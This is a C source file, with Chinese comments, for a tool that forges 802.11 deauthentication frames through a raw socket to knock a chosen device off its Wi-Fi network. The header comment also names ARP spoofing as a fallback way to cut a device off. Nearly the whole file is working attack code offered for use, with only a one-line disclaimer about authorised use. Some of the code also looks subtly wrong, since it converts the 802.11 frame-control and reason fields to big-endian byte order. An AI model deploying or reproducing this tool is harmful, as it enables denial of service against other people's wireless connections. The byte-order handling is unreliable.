/*
 * 强制踢下线工具（802.11 deauth 帧注入，Wi-Fi 杀手原理）。
 *
 * 用法: deauth <iface> <target_mac> <bssid> [count] [interval_ms]
 *   例: deauth wlan0 aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 20 100
 *
 * 原理：持续向目标设备发送伪造的 802.11 deauthentication 管理帧，
 * 宣称"目标已与 AP(bssid) 断开连接"，目标设备收到后会主动断开当前 Wi-Fi
 * （表现为自己掉线重连），达到"强制踢下线"效果。
 *
 * 实现：AF_PACKET raw socket 直接注入 26 字节 deauth 帧（24 头 + 2 reason），
 * 无需 libpcap。需 root。
 *
 * 注意：
 * - Android Wi-Fi 芯片/驱动多不支持应用层注入管理帧（managed 模式 tx 路径
 *   期望 802.3 帧），效果因设备/驱动而异——部分设备无效，属已知限制；
 *   无效时可改用 ARP 欺骗静默（不转发）实现断网。
 * - 仅限对**自己拥有或已获明确授权**的设备使用，法律责任由使用者承担。
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

/* 802.11 deauth 帧：24 字节管理帧头 + 2 字节 reason code */
struct __attribute__((packed)) ieee80211_deauth {
    unsigned short frame_ctrl; /* 0x00C0 = deauth */
    unsigned short duration;
    unsigned char dst[6];      /* 目标设备 MAC */
    unsigned char src[6];      /* AP（bssid）MAC */
    unsigned char bssid[6];
    unsigned short seq_ctrl;
    unsigned short reason;     /* 7 = 非关联状态收到帧 */
};

/* 解析 MAC（"aa:bb:cc:dd:ee:ff"） */
static int parse_mac(const char *s, unsigned char *out) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out[i] = (unsigned char)v[i];
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s <iface> <target_mac> <bssid> [count] [interval_ms]\n", argv[0]);
        return 1;
    }
    const char *ifname = argv[1];
    unsigned char target[6], bssid[6];
    if (parse_mac(argv[2], target) < 0 || parse_mac(argv[3], bssid) < 0) {
        fprintf(stderr, "bad mac\n");
        return 1;
    }
    int count = argc >= 5 ? atoi(argv[4]) : 20;
    int interval = argc >= 6 ? atoi(argv[5]) : 100;
    if (count <= 0) count = 20;
    if (interval <= 0) interval = 100;

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, target, 6);

    struct ieee80211_deauth f;
    memset(&f, 0, sizeof(f));
    f.frame_ctrl = htons(0x00C0); /* deauth 管理帧 */
    f.duration = 0;
    memcpy(f.dst, target, 6);
    memcpy(f.src, bssid, 6);
    memcpy(f.bssid, bssid, 6);
    f.reason = htons(7);

    fprintf(stderr, "deauth: %s target %s bssid %s frames %d interval %dms\n",
            ifname, argv[2], argv[3], count, interval);

    unsigned short seq = 0;
    for (int i = 0; i < count; i++) {
        f.seq_ctrl = htons(seq);
        if (sendto(fd, &f, sizeof(f), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
            perror("sendto");
            break;
        }
        seq += 16; /* 802.11 序列号步进 16 */
        usleep(interval * 1000);
    }
    close(fd);
    return 0;
}
